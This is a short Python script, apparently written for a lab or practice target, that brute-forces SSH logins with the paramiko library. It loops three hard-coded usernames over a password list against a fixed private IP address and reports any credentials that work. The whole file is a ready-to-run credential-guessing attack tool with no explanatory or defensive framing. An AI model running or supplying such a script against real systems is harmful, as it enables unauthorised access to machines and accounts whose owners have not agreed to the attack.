import paramiko
import time
 
target_ip = '172.18.37.154'
port = 22
 
usernames = ['admin', 'zee', 'user']
# get passwords from passwords.txt
passwords = [line.strip() for line in open('passwords.txt', 'r')]
 
# Function to attempt SSH login
def ssh_brute_force(ip, port, usernames, passwords):
    for username in usernames:
        for password in passwords:
            try:
                # Create an SSH client instance
                ssh_client = paramiko.SSHClient()
                ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())  # Automatically add host key
 
                print(f"Trying username: {username} and password: {password}")
 
                # Attempt to connect to the SSH server
                ssh_client.connect(ip, port=port, username=username, password=password, timeout=5)
 
                # If login is successful, print and exit
                print(f"Login successful with {username}:{password}")
                ssh_client.close()
                return
 
            except paramiko.AuthenticationException:
                # If authentication fails, continue
                print(f"Failed login attempt: {username}:{password}")
                pass
            except Exception as e:
                print(f"Error: {str(e)}")
                pass
            finally:
                ssh_client.close()

    print("Brute force attempt completed.") 


ssh_brute_force(target_ip, port, usernames, passwords)